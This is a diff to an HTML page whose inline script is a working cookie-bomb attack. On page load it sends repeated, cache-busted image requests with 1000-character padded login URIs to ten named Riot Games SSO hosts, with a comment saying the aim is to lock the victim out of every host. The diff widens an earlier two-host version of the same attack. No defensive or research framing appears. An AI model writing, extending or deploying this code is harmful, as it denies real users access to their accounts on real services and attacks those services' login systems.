@@ -9,32 +9,35 @@
 
 <body>
   <script>
-    async function cookieBomb() {
-      const target = 'https://xsso.riotgames.com/login?uri=https://riotgames.com/test?x=' + 'A'.repeat(1000)
-
-      for (let i = 0; i < 10; i++) {
-        await new Promise(resolve => {
-          const img = new Image()
-          img.onload = img.onerror = resolve // either way, the request was made
-          img.src = target + '&cachebust=' + Math.random() // prevent caching
-        })
+    const payload = "A".repeat(1000);
+    
+    // Each xsso host needs a uri that matches its own brand domain
+    const targets = [
+      ["xsso.riotgames.com",        "https://riotgames.com/"],
+      ["xsso.leagueoflegends.com",  "https://www.leagueoflegends.com/"],
+      ["xsso.playvalorant.com",     "https://playvalorant.com/"],
+      ["xsso.playruneterra.com",    "https://playruneterra.com/"],
+      ["xsso.lolesports.com",       "https://lolesports.com/"],
+      ["xsso.riotesports.com",      "https://riotesports.com/"],
+      ["xsso.valorantesports.com",  "https://valorantesports.com/"],
+      ["xsso.competetft.com",       "https://competetft.com/"],
+      ["xsso.playriftbound.com",    "https://playriftbound.com/"],
+      ["xsso.arcane.com",           "https://arcane.com/"],
+    ];
+    
+    async function flood(host, uri) {
+      const base = `https://${host}/login?uri=${uri}?x=${payload}`;
+      for (let i = 0; i < 12; i++) {
+        await new Promise((resolve) => {
+          const img = new Image();
+          img.onload = img.onerror = resolve;
+          img.src = base + "&cb=" + Math.random();
+        });
       }
     }
-
-    async function cookieBomb2() {
-      const target = 'https://xsso.leagueoflegends.com/login?uri=https://leagueoflegends.com/test?x=' + 'A'.repeat(1000)
-
-      for (let i = 0; i < 10; i++) {
-        await new Promise(resolve => {
-          const img = new Image()
-          img.onload = img.onerror = resolve // either way, the request was made
-          img.src = target + '&cachebust=' + Math.random() // prevent caching
-        })
-      }
-    }
-
-    cookieBomb();
-    cookieBomb2();
+    
+    // Lock the victim out of every xsso host at once
+    targets.forEach(([h, u]) => flood(h, u));
   </script>
 </body>
 
